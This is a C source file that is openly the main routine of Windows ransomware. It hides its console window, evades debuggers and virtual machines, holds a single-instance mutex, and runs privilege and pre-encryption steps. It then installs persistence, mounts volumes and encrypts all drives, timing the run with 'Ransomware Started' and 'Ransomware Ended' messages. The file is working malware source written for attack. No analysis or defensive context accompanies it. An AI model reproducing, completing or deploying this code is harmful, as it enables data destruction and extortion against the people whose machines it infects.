#include "debug.h"
#include "anti.h"
#include "pre.h"
#include "persistence.h"
#include "encryptor.h"
#include <time.h>

/* Name of the one-instance mutex. */
#define MUTEX_NAME L"ef223080-f09c-413a-89db-62d675d90f56"

int main(int argc, char* argv[])
{
	Sleep(500);		// Allow the original program to stop
#ifndef DEBUG
	HWND hwnd = GetConsoleWindow();
	if (hwnd)
		ShowWindow(hwnd, SW_HIDE);
#endif
	
	dbginit();
	if (!IsWindowsVistaOrGreater())
	{
		ndbgmsg("OS must be Windows Vista or greater\n");
		return 1;
	}
	if (skipExecution())
	{
		ndbgmsg("Debugger or VM detected. Skipping\n");
		return 2;
	}

	// One-Instance mutex
	HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
	if (!hMutex)
		return 3;
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		ndbgmsg("Program already running\n");
		goto cleanup;
	}
	
	// Execute all pre-encryption tasks
	int status = preEncryption();
	if (status == PSTATUS_GOT_ADMIN)
		goto cleanup;
	ndbgmsg("Pre-Encryption returned status: %d\n\n", status);
	
	// Become persistent in case of a system shutdown
	ndbgmsg("Becoming persistent\n\n");
	becomePersistent();
	
	// Initialize encryption variables
	status = preEncryptionInitialization();
	if (!status)
	{
		ndbgmsg("Failed encryption initialization\n");
		goto cleanup;
	}

	// Late pre-encryption
	status = latePreEncryption();
	ndbgmsg("Late pre-encryption returned status: %d\n\n", status);

	ndbgmsg("Mounting Volumes\n");
	status = mountVolumes();
	ndbgmsg("Volume mounting returned status: %d\n", status);
	
	ndbgmsg("\nRansomware Started\n");
	time_t t0 = time(NULL);
	BOOL result = encryptDrives();
	time_t t1 = time(NULL);

	ndbgstatus(result, "Ransomware Ended");
	ndbgmsg("%.03f seconds / %.03f minutes\n\n", (float)(t1 - t0), (float)(t1 - t0) / 60);

cleanup:
	removePersistence();
	
	ReleaseMutex(hMutex);
	CloseHandle(hMutex);
	
	dbgend();
	return 0;
}